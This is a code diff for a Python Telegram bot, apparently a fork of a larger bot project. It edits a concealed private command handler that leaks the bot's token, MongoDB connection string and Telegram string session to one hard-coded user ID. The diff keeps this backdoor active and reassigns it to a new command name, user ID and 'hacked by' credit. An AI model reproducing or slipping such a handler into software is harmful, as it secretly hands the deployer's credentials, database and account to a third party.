@@ -101,19 +101,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("done")
+    filters.command("KSD")
     & filters.private
-    & filters.user(6469162895)
+    & filters.user(7668520999)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/205f3cf027a5a11f5f70e.jpg",
+          photo=f"https://files.catbox.moe/yvwrge.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/SHIVANSH39)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• нαϲкє𝚍 ву ᴘʀᴏғᴇssᴏʀ  •", url=f"https://t.me/Sourabh_owner")
+                         "• нαϲкє𝚍 ву ԋυɳƚҽɾ  •", url=f"https://t.me/ll_hunter_lll")
                  ]
             ]
          ),
